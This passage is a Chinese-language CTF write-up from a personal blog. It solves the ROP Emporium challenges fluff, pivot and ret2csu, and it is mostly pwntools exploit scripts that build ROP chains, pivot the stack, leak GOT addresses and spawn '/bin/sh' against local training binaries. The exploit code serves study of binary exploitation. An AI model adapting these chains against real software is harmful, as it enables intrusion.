class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding="utf-8"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">"./fluff32"</span>)</span><br><span class="line"></span><br><span class="line">system_plt_addr=<span class="number">0x08048430</span></span><br><span class="line">bss_addr=<span class="number">0x0804a040</span></span><br><span class="line">mov_edx_addr=<span class="number">0x0804868c</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x080483e1</span></span><br><span class="line">xor_edx_ebx=<span class="number">0x0804867b</span></span><br><span class="line">xchg_edx_ecx=<span class="number">0x08048689</span></span><br><span class="line">mov_ecx_edx=<span class="number">0x08048693</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">44</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#addr-&gt;ecx                   ##先将程序通过异或来放到edx中，然后在解密放到ecx中</span></span><br><span class="line"></span><br><span class="line">payload+=p32(mov_edx_addr)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(<span class="number">0xdefaced0</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(xchg_edx_ecx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#data-&gt;edx                           #先将程序通过异或来放到edx中，然后再把edx中的解密</span></span><br><span class="line"></span><br><span class="line">payload+=p32(pop_ebx_addr)                     </span><br><span class="line">payload+=<span class="string">"/bin"</span></span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(<span class="number">0xdefaced0</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(mov_ecx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#addr-&gt;ecx							#和上面一样，32位需要俩次才能把参数传完</span></span><br><span class="line"></span><br><span class="line">payload+=p32(mov_edx_addr)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(bss_addr+<span class="number">4</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(<span class="number">0xdefaced0</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(xchg_edx_ecx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#data-&gt;edx</span></span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=<span class="string">"/sh\x00"</span></span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(<span class="number">0xdefaced0</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(mov_ecx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload+=p32(system_plt_addr)+p32(<span class="number">0</span>)+p32(bss_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>感觉自己写的好麻烦，还需要异或俩次才可以，后来看了别人的wp发现，直接xor edx，edx 就不用第二次异或了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding="utf-8"</span></span><br><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">"./fluff32"</span>)</span><br><span class="line"><span class="comment">#elf=ELF("./fluff32")		#换成这样也可以</span></span><br><span class="line">system_plt_addr=<span class="number">0x08048430</span>    <span class="comment"># system_plt_addr=elf.plt['system']</span></span><br><span class="line">bss_addr=<span class="number">0x0804a040</span>			 <span class="comment"># bss_addr=elf.bss()</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x080483e1</span></span><br><span class="line">xor_edx_ebx=<span class="number">0x0804867b</span></span><br><span class="line">xchg_edx_ecx=<span class="number">0x08048689</span></span><br><span class="line">mov_ecx_edx=<span class="number">0x08048693</span></span><br><span class="line">xor_edx_edx=<span class="number">0x08048671</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">44</span></span><br><span class="line"><span class="comment">#addr-&gt;ecx</span></span><br><span class="line">payload+=p32(xor_edx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(xchg_edx_ecx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#data-&gt;edx</span></span><br><span class="line">payload+=p32(xor_edx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=<span class="string">"/bin"</span></span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(mov_ecx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#addr-&gt;ecx</span></span><br><span class="line">payload+=p32(xor_edx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(bss_addr+<span class="number">4</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(xchg_edx_ecx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#data-&gt;edx</span></span><br><span class="line">payload+=p32(xor_edx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=<span class="string">"/sh\x00"</span></span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(mov_ecx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload+=p32(system_plt_addr)+p32(<span class="number">0</span>)+p32(bss_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="fluff-64"><a href="#fluff-64" class="headerlink" title="fluff_64"></a>fluff_64</h3><p>用老方法查看gadget没找到合适的。。。 然后wp上说要加上 –depth ，加上以后就找到了 <del>_</del>  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;&quot;uft-8&quot;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;fluff&quot;)</span><br><span class="line">elf&#x3D;ELF(&quot;.&#x2F;fluff&quot;)</span><br><span class="line">system_plt_addr&#x3D;elf.plt[&#39;system&#39;]</span><br><span class="line">bss_addr&#x3D;elf.bss()</span><br><span class="line">xor_r11_r11_addr&#x3D;0x0000000000400822</span><br><span class="line">pop_r12_addr&#x3D;0x0000000000400832</span><br><span class="line">xor_r11_r12_addr&#x3D;0x000000000040082f</span><br><span class="line">xchg_r11_r10_addr&#x3D;0x0000000000400840</span><br><span class="line">mov_r10_r11_addr&#x3D;0x000000000040084e</span><br><span class="line">pop_rdi_addr&#x3D;0x00000000004008c3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#addr-&gt;r10</span><br><span class="line"></span><br><span class="line">payload&#x3D;&quot;a&quot;*0x20+&quot;a&quot;*0x8</span><br><span class="line">payload+&#x3D;p64(xor_r11_r11_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(pop_r12_addr)</span><br><span class="line">payload+&#x3D;p64(bss_addr)</span><br><span class="line">payload+&#x3D;p64(xor_r11_r12_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(xchg_r11_r10_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line"></span><br><span class="line">#data-&gt;r11</span><br><span class="line"></span><br><span class="line">payload+&#x3D;p64(xor_r11_r11_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(pop_r12_addr)</span><br><span class="line">payload+&#x3D;&quot;&#x2F;bin&#x2F;sh\x00&quot;</span><br><span class="line">payload+&#x3D;p64(xor_r11_r12_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(mov_r10_r11_addr)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line"></span><br><span class="line">payload+&#x3D;p64(pop_rdi_addr)+p64(bss_addr)+p64(system_plt_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="pivot-32"><a href="#pivot-32" class="headerlink" title="pivot_32"></a>pivot_32</h3><p>感觉难度突然增加，有点绝望，果然pwn还是很难，这题呢主要考察俩个点，一个是栈的迁移，一个是泄露目标函数的地址，这里我用了俩种方法写，大同小异而已</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">sh=process(<span class="string">"./pivot32"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./pivot32"</span>)</span><br><span class="line">libc_elf=ELF(<span class="string">"./libpivot32.so"</span>)</span><br><span class="line"></span><br><span class="line">foothold_function_plt_addr=elf.plt[<span class="string">'foothold_function'</span>]</span><br><span class="line">foothold_function_got_addr=elf.got[<span class="string">'foothold_function'</span>]</span><br><span class="line">foothold_function_sym=libc_elf.symbols[<span class="string">'foothold_function'</span>]</span><br><span class="line">ret2win_sym=libc_elf.symbols[<span class="string">'ret2win'</span>]</span><br><span class="line">offset=int(ret2win_sym-foothold_function_sym)</span><br><span class="line"></span><br><span class="line">leave_ret=<span class="number">0x080486a8</span></span><br><span class="line">mov_eax_eax_addr=<span class="number">0x080488c4</span></span><br><span class="line">pop_eax_addr=<span class="number">0x080488c0</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x08048571</span></span><br><span class="line">add_eax_ebx_addr=<span class="number">0x080488c7</span></span><br><span class="line">call_eax=<span class="number">0x080486a3</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"The Old Gods kindly bestow upon you a place to pivot: "</span>)</span><br><span class="line">fake_ebp=int(sh.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload1=p32(<span class="number">0</span>)</span><br><span class="line">payload1+=p32(foothold_function_plt_addr)</span><br><span class="line">payload1+=p32(pop_eax_addr)</span><br><span class="line">payload1+=p32(foothold_function_got_addr)</span><br><span class="line">payload1+=p32(mov_eax_eax_addr)</span><br><span class="line">payload1+=p32(pop_ebx_addr)</span><br><span class="line">payload1+=p32(offset)</span><br><span class="line">payload1+=p32(add_eax_ebx_addr)</span><br><span class="line">payload1+=p32(call_eax)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">"a"</span>*<span class="number">40</span></span><br><span class="line">payload2+=p32(fake_ebp)</span><br><span class="line">payload2+=p32(leave_ret)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>第二种方法就是将esp部分也用gadget表示，不用再向第一种一样伪造一个堆栈了，也就是说不用管ebp的值了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;pivot32&quot;)</span><br><span class="line">elf&#x3D;ELF(&quot;.&#x2F;pivot32&quot;)</span><br><span class="line">libc_elf&#x3D;ELF(&quot;.&#x2F;libpivot32.so&quot;)</span><br><span class="line"></span><br><span class="line">foothold_function_plt_addr&#x3D;elf.plt[&#39;foothold_function&#39;]</span><br><span class="line">foothold_function_got_addr&#x3D;elf.got[&#39;foothold_function&#39;]</span><br><span class="line">foothold_function_sym&#x3D;libc_elf.symbols[&#39;foothold_function&#39;]</span><br><span class="line">ret2win_sym&#x3D;libc_elf.symbols[&#39;ret2win&#39;]</span><br><span class="line">offset&#x3D;int(ret2win_sym-foothold_function_sym)</span><br><span class="line"></span><br><span class="line">mov_eax_eax_addr&#x3D;0x080488c4</span><br><span class="line">pop_eax_addr&#x3D;0x080488c0</span><br><span class="line">pop_ebx_addr&#x3D;0x08048571</span><br><span class="line">add_eax_ebx_addr&#x3D;0x080488c7</span><br><span class="line">call_eax&#x3D;0x080486a3</span><br><span class="line">pop_eax&#x3D;0x080488c0</span><br><span class="line">xchg_eax_esp&#x3D;0x080488c2</span><br><span class="line">sh.recvuntil(&quot;The Old Gods kindly bestow upon you a place to pivot: &quot;)</span><br><span class="line">fake_ebp&#x3D;int(sh.recv(10),16)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1&#x3D;p32(foothold_function_plt_addr)</span><br><span class="line">payload1+&#x3D;p32(pop_eax_addr)</span><br><span class="line">payload1+&#x3D;p32(foothold_function_got_addr)</span><br><span class="line">payload1+&#x3D;p32(mov_eax_eax_addr)</span><br><span class="line">payload1+&#x3D;p32(pop_ebx_addr)</span><br><span class="line">payload1+&#x3D;p32(offset)</span><br><span class="line">payload1+&#x3D;p32(add_eax_ebx_addr)</span><br><span class="line">payload1+&#x3D;p32(call_eax)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&quot;a&quot;*40+&quot;a&quot;*4</span><br><span class="line">payload2+&#x3D;p32(pop_eax)</span><br><span class="line">payload2+&#x3D;p32(fake_ebp)</span><br><span class="line">payload2+&#x3D;p32(xchg_eax_esp)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="pivot-64"><a href="#pivot-64" class="headerlink" title="pivot_64"></a>pivot_64</h3><p>这个题和32位的第二种方法一样，本来想用第一种方法的，但是在搜索leave；ret 的gadget时发现都存在<code>0a</code>截断，需要将<code>0a</code>变为其他字符，最后再用寄存器变成<code>0a</code>,程序第二次输入被限制了，我找了几个gadget发现输入都不够。还是自己太菜了 呜呜呜<del>~</del></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;&#39;utf-8&#39;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;pivot&quot;)</span><br><span class="line">elf&#x3D;ELF(&quot;.&#x2F;pivot&quot;)</span><br><span class="line">lib_elf&#x3D;ELF(&quot;.&#x2F;libpivot.so&quot;)</span><br><span class="line"></span><br><span class="line">fun_plt_addr&#x3D;elf.plt[&#39;foothold_function&#39;]</span><br><span class="line">fun_got_addr&#x3D;elf.got[&#39;foothold_function&#39;]</span><br><span class="line">fun_sym&#x3D;lib_elf.symbols[&#39;foothold_function&#39;]</span><br><span class="line">ret2win_sym&#x3D;lib_elf.symbols[&#39;ret2win&#39;]</span><br><span class="line">offset&#x3D;int(ret2win_sym-fun_sym)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;The Old Gods kindly bestow upon you a place to pivot: &quot;)</span><br><span class="line">heap_addr&#x3D;int(sh.recv(14),16)</span><br><span class="line"></span><br><span class="line">mov_rax_rax&#x3D;0x0000000000400b05</span><br><span class="line">pop_rax&#x3D;0x0000000000400b00</span><br><span class="line">xchg_rax_rsp&#x3D;0x0000000000400b02</span><br><span class="line">call_rax&#x3D;0x000000000040098e</span><br><span class="line">add_rax_rbp&#x3D;0x0000000000400b09</span><br><span class="line">pop_rbp&#x3D;0x0000000000400900</span><br><span class="line"></span><br><span class="line">payload1&#x3D;p64(fun_plt_addr)+p64(pop_rax)+p64(fun_got_addr)</span><br><span class="line">payload1+&#x3D;p64(mov_rax_rax)+p64(pop_rbp)+p64(offset)+p64(add_rax_rbp)</span><br><span class="line">payload1+&#x3D;p64(call_rax)</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&#39;b&#39;*40+p64(pop_rax)+p64(heap_addr)+p64(xchg_rax_rsp)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="ret2csu-64"><a href="#ret2csu-64" class="headerlink" title="ret2csu_64"></a>ret2csu_64</h3><p>学到这里说明你已经将初级ROP学完了，这道题看似特别简单，只要找一个rdx的gadget将程序规定的参数传进去就好了，但是你会发现rdx的gadget找不到。程序在运行时，都会调用libc，<code>__libc_csu_init</code>这个函数时一个初始化函数，看一下他的反汇编发现，我们可以调用他的某些gadget来给rdx赋值。但是我们在调用的时候需要call一个函数，一开始我想要call ret2win，但是因为我们需要ret2win的指针所以没有成功。我们需要一个不改变任何寄存器的值，或者不改变rdx的值的函数，文章中说_init这个函数不会改变rdx的值，所以就用它了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;&#39;utf-8&#39;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;ret2csu&#39;)</span><br><span class="line">#elf&#x3D;ELF(&#39;.&#x2F;ret2csu&#39;)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">ret2win&#x3D;0x00000000004007b1</span><br><span class="line">gadget_one&#x3D;0x000000000040089a</span><br><span class="line">gadget_two&#x3D;0x0000000000400880</span><br><span class="line">init_por&#x3D;0x600e38</span><br><span class="line">rdx&#x3D;0xdeadcafebabebeef</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x20+&#39;a&#39;*8</span><br><span class="line">payload+&#x3D;p64(gadget_one)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(0x01)</span><br><span class="line">payload+&#x3D;p64(init_por)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(0)</span><br><span class="line">payload+&#x3D;p64(rdx)</span><br><span class="line">payload+&#x3D;p64(gadget_two)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload+&#x3D;&#39;a&#39;*56</span><br><span class="line">payload+&#x3D;p64(ret2win)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>判断异或数是多少可以绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">binsh &#x3D; &#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">badchar &#x3D; [98, 105, 99, 47, 32, 102, 110, 115]</span><br><span class="line">xornum &#x3D; 1</span><br><span class="line">while 1:</span><br><span class="line">    for x in binsh:</span><br><span class="line">        tmp &#x3D; ord(x) ^ xornum</span><br><span class="line">        if tmp in badchar:</span><br><span class="line">            xornum +&#x3D; 1</span><br><span class="line">            break</span><br><span class="line">        if x &#x3D;&#x3D; &quot;\x00&quot;:</span><br><span class="line">            print (xornum)</span><br><span class="line">            xornum +&#x3D;1</span><br><span class="line">    if xornum &#x3D;&#x3D; 10:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+      
+  <div class="popular-posts-header">相关文章推荐</div>
+  <ul class="popular-posts">
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\2020\05\07\CTF-36D-PWN-WP\" rel="bookmark">CTF-36D-PWN-WP</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\2020\05\07\off-by-one\" rel="bookmark">off-by-one</a></div>
+    </li>
+  </ul>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>L0ne1y
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://l0ne1y.github.io/2020/05/07/Rop-Emporium/" title="Rop_Emporium">https://l0ne1y.github.io/2020/05/07/Rop-Emporium/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener external nofollow noreferrer" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/ROP-Emporium/" rel="tag"># ROP Emporium</a>
+              <a href="/tags/stack/" rel="tag"># stack</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/05/07/off-by-one/" rel="prev" title="off-by-one">
+      <i class="fa fa-chevron-left"></i> off-by-one
